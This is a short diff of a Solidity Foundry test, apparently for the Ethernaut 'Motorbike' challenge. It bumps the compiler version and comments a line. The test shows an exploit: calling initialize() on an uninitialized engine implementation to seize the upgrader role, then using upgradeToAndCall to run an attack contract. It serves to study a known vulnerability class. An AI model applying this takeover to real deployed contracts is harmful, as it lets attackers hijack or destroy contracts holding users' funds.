@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.13;
+pragma solidity ^0.8.15;
 
 import "forge-std/Test.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
@@ -21,7 +21,7 @@ contract ContractTest is Test {
         MotorbikeContract= new Motorbike(address(EngineContract));
         AttackContract = new Attack();
         console.log("Unitialized Upgrader:",EngineContract.upgrader());
-        address(EngineContract).call(abi.encodeWithSignature("initialize()"));
+        address(EngineContract).call(abi.encodeWithSignature("initialize()"));  // call initialize() to become upgrader.
         console.log("Initialized Upgrader:",EngineContract.upgrader());
         bytes memory initEncoded = abi.encodeWithSignature("attack()");
         address(EngineContract).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",address(AttackContract),initEncoded));
